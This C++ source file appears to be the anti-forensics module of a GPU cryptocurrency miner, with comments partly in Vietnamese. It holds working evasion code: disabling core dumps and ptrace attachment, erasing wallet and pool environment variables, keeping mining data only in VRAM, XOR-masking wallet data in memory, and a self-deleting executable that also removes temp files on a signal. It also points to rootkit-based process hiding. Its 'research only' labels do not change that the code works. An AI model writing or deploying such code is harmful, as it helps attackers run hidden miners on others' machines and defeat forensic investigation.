#include "evasion.h"
#include <sys/resource.h>
#include <sys/prctl.h>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <cstring>

namespace redteam::evasion {

// ============================================================================
// Core Dump Prevention
// ============================================================================

void DisableCoreDumps() {
    struct rlimit rl;

    // Set core dump size limit to 0
    rl.rlim_cur = 0;
    rl.rlim_max = 0;

    if (setrlimit(RLIMIT_CORE, &rl) == 0) {
        printf("[ANTI-FORENSICS] Core dumps disabled ✓\n");
    } else {
        perror("[ANTI-FORENSICS] Failed to disable core dumps");
    }

    #ifdef __linux__
    // Also set process as non-dumpable (prevents gcore, ptrace attach)
    if (prctl(PR_SET_DUMPABLE, 0) == 0) {
        printf("[ANTI-FORENSICS] Process set to non-dumpable ✓\n");
    }
    #endif
}

// ============================================================================
// Environment Variable Cleanup
// ============================================================================

void ClearSensitiveEnvVars() {
    // List of sensitive environment variables to clear
    const char* sensitive_vars[] = {
        "MINING_SERVER_GPU",
        "MINING_WALLET_GPU",
        "MINING_POOL_URL",
        "MINING_WALLET",
        "POOL_PASSWORD",
        "WORKER_NAME",
        "API_KEY",
        "SECRET_KEY",
        nullptr
    };

    int cleared_count = 0;

    for (int i = 0; sensitive_vars[i] != nullptr; i++) {
        if (getenv(sensitive_vars[i]) != nullptr) {
            unsetenv(sensitive_vars[i]);
            cleared_count++;
        }
    }

    if (cleared_count > 0) {
        printf("[ANTI-FORENSICS] Cleared %d sensitive environment variables\n", cleared_count);
    }
}

// ============================================================================
// In-Memory DAG (No Disk Writes)
// ============================================================================

void* CreateInMemoryDAG(uint32_t epoch, int device_id) {
    // DAG được tạo hoàn toàn trong VRAM, không write ra disk
    // Implemented in dag_generator.cu

    printf("[ANTI-FORENSICS] Creating in-memory DAG (epoch %u)\n", epoch);
    printf("  ⚠️  No disk writes - DAG exists only in VRAM\n");
    printf("  ⚠️  No /tmp/kawpow_dag_* or /var/tmp/ethash_* files\n");

    // Call CUDA function (implemented in dag_generator.cu)
    extern "C" uint64_t* generate_dag_in_vram(int device_id, uint32_t epoch);
    uint64_t* d_dag = generate_dag_in_vram(device_id, epoch);

    printf("[ANTI-FORENSICS] In-memory DAG created at device pointer: %p\n", d_dag);

    return d_dag;
}

// ============================================================================
// Self-Deletion (DANGEROUS - Research Only!)
// ============================================================================

static bool self_deletion_armed = false;
static std::string executable_path;

static void self_delete_handler(int signum) {
    if (self_deletion_armed) {
        printf("\n[ANTI-FORENSICS] Self-deletion triggered by signal %d\n", signum);

        // Delete executable file
        if (!executable_path.empty()) {
            if (unlink(executable_path.c_str()) == 0) {
                printf("[ANTI-FORENSICS] Executable deleted: %s\n", executable_path.c_str());
            } else {
                perror("[ANTI-FORENSICS] Failed to delete executable");
            }
        }

        // Delete any temporary files
        system("rm -f /tmp/.evasion_report.json");
        system("rm -f /tmp/.tf_training.log");

        printf("[ANTI-FORENSICS] Cleanup completed, exiting\n");
    }

    // Call default signal handler (exit)
    exit(0);
}

void EnableSelfDeletion() {
    printf("\n");
    printf("⚠️⚠️⚠️ WARNING: SELF-DELETION ARMED ⚠️⚠️⚠️\n");
    printf("Executable will DELETE ITSELF on SIGTERM/SIGINT\n");
    printf("This is DANGEROUS and for RESEARCH ONLY!\n");
    printf("\n");

    // Get executable path
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);

    if (len != -1) {
        exe_path[len] = '\0';
        executable_path = exe_path;

        // Arm self-deletion
        self_deletion_armed = true;

        // Install signal handlers
        signal(SIGTERM, self_delete_handler);
        signal(SIGINT, self_delete_handler);

        printf("[ANTI-FORENSICS] Self-deletion armed for: %s\n", exe_path);
    } else {
        perror("[ANTI-FORENSICS] Failed to get executable path");
    }
}

// ============================================================================
// Process Hiding Techniques (Linux-specific)
// ============================================================================

/**
 * **Hide from Process List** (ẩn khỏi danh sách tiến trình)
 *
 * NGHIÊN CỨU: Các techniques phức tạp hơn (kernel module, LD_PRELOAD hook libc)
 * nằm ngoài scope của tool này. Đây chỉ là placeholder.
 *
 * Advanced evasion cần:
 * - Rootkit kernel module (hook getdents64 syscall)
 * - LD_PRELOAD library hook readdir/opendir
 * - Container escape + host kernel manipulation
 */
bool HideFromProcessList() {
    // TODO: Implement advanced hiding (out of scope for this research)
    printf("[ANTI-FORENSICS] Advanced process hiding not implemented\n");
    printf("  Note: Requires kernel module or LD_PRELOAD rootkit\n");
    return false;
}

// ============================================================================
// Memory Forensics Countermeasures
// ============================================================================

/**
 * **Encrypt Sensitive Memory** (mã hóa bộ nhớ nhạy cảm)
 *
 * NGHIÊN CỨU: Encrypt wallet address, pool URL trong memory
 * để memory dump không reveal sensitive data.
 */
void EncryptSensitiveMemory(void* data, size_t size, const char* key) {
    // Simple XOR encryption (trong production dùng AES)
    unsigned char* bytes = (unsigned char*)data;
    size_t key_len = strlen(key);

    for (size_t i = 0; i < size; i++) {
        bytes[i] ^= key[i % key_len];
    }

    printf("[ANTI-FORENSICS] Encrypted %zu bytes of sensitive memory\n", size);
}

/**
 * **Secure Memory Wipe** (xóa bộ nhớ an toàn - trước khi free)
 */
void SecureWipe(void* ptr, size_t size) {
    // Prevent compiler optimization from removing memset
    volatile unsigned char* p = (volatile unsigned char*)ptr;
    while (size--) {
        *p++ = 0;
    }
}

// ============================================================================
// File System Anti-Forensics
// ============================================================================

/**
 * **Use tmpfs Only** (chỉ dùng tmpfs - RAM filesystem, không persist)
 */
bool ConfigureTmpfsStorage() {
    // Check if /tmp is mounted as tmpfs
    FILE* fp = fopen("/proc/mounts", "r");
    if (!fp) {
        return false;
    }

    char line[1024];
    bool tmpfs_found = false;

    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "tmpfs") && strstr(line, "/tmp")) {
            tmpfs_found = true;
            break;
        }
    }

    fclose(fp);

    if (tmpfs_found) {
        printf("[ANTI-FORENSICS] /tmp is tmpfs (RAM-only) ✓\n");
        printf("  Files written to /tmp will not persist across reboot\n");
    } else {
        printf("[ANTI-FORENSICS] ⚠️ /tmp is NOT tmpfs (disk-backed)\n");
        printf("  Recommend mounting /tmp as tmpfs for anti-forensics\n");
    }

    return tmpfs_found;
}

/**
 * **Disable Logging** (tắt ghi log - minimize artifacts)
 */
void MinimizeLogging() {
    // Redirect stdout/stderr to /dev/null (hoặc tmpfs log)
    // Trong research build, giữ logging để analysis

    printf("[ANTI-FORENSICS] Logging minimization: DISABLED (research build)\n");
    printf("  Production build should redirect to /dev/null or encrypted tmpfs\n");

    // Example production code:
    // freopen("/dev/null", "w", stdout);
    // freopen("/dev/null", "w", stderr);
}

} // namespace redteam::evasion
